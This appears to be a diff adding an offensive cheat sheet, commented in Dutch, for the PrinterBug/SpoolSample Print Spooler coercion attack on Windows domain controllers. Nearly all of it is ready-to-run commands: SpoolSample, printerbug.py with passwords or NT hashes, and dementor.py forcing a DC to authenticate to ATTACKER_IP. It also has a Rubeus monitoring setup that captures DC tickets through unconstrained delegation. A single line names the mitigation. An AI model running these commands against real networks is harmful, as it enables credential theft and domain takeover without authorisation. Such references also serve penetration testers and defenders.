@@ -1,0 +1,35 @@
+# PrinterBug / SpoolSample — Print Spooler coercion
+# Forceert NTLM authenticatie via de Print Spooler service (MS-RPRN)
+# Klassieke coercion techniek, vaak aanwezig op DCs
+#
+# === Vereisten ===
+# - Print Spooler service actief op doelwit (standaard op DCs)
+# - Domain user credentials
+#
+# === Voorbeelden ===
+
+# SpoolSample (Windows binary)
+.\SpoolSample.exe DC_HOSTNAME ATTACKER_HOSTNAME
+
+# printerbug.py (impacket-stijl)
+python3 printerbug.py DOMAIN/USER:'PASS'@DC_IP ATTACKER_IP
+
+# Met hash authenticatie
+python3 printerbug.py DOMAIN/USER@DC_IP ATTACKER_IP -hashes :NT_HASH
+
+# Dementor (alternatief)
+python3 dementor.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP DC_IP
+
+# Combinatie met unconstrained delegation
+# Terminal 1: Monitor voor TGTs
+.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC$ /filteruser:DC$
+# Terminal 2: Trigger coercion
+.\SpoolSample.exe DC_HOSTNAME UNCONSTRAINED_HOST
+
+# Check of Print Spooler actief is
+python3 rpcdump.py DOMAIN/USER:'PASS'@DC_IP | grep -i spoolsv
+ls \\DC_HOSTNAME\pipe\spoolss
+
+# Noot: Print Spooler staat standaard aan op Windows Servers
+# Noot: Mitigatie: Disable Print Spooler service op DCs
+# Noot: Download SpoolSample: https://github.com/leechristensen/SpoolSample
